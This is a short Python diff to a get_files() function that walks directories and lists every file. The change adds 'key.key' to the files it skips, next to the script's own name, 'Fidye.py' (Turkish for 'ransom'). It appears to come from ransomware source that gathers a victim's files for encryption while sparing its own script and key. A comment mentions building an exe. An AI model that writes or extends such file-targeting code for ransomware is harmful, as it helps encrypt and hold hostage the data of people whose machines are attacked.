@@ -28,7 +28,7 @@ def get_files() -> list:
 
     for root, dirs, files in dosyaklasor_list:
         for file in files:
-            if file == 'Fidye.py': # Replace if you will be create a exe file
+            if file == 'Fidye.py' or file == 'key.key': # Replace if you will be create a exe file
                 continue
             full_path = os.path.join(root, file)
             file_list.append(full_path)
